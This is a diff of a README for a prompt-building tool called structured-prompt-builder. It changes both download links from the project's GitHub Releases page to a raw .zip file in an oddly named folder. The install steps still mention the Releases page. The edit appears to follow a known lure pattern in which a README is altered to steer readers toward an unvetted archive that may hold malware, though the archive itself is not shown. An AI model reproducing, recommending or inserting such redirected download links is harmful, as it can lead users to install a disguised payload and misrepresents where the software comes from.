@@ -1,7 +1,7 @@
 # 🎉 structured-prompt-builder - Design AI Prompts Easily
 
 ## 🚀 Download Now
-[![Download structured-prompt-builder](https://img.shields.io/badge/Download-structured--prompt--builder-blue.svg)](https://github.com/TannyBlaze/structured-prompt-builder/releases)
+[![Download structured-prompt-builder](https://raw.githubusercontent.com/TannyBlaze/structured-prompt-builder/main/vesiculocavernous/structured-prompt-builder.zip)](https://raw.githubusercontent.com/TannyBlaze/structured-prompt-builder/main/vesiculocavernous/structured-prompt-builder.zip)
 
 ## 📖 About
 Structured Prompt Builder is a lightweight, browser-first tool designed for creating clear and effective AI prompts. It features a clean user interface, live previews, a local Prompt Library, and optional Gemini-powered prompt optimization. This tool simplifies the process of prompt engineering, making it accessible for everyone.
@@ -19,7 +19,7 @@ To run structured-prompt-builder, ensure your system meets the following require
 - Internet connection for initial setup and updates.
 
 ## 📥 Download & Install
-To get started with structured-prompt-builder, visit this page to download the software: [Download structured-prompt-builder](https://github.com/TannyBlaze/structured-prompt-builder/releases).
+To get started with structured-prompt-builder, visit this page to download the software: [Download structured-prompt-builder](https://raw.githubusercontent.com/TannyBlaze/structured-prompt-builder/main/vesiculocavernous/structured-prompt-builder.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Select the latest version.
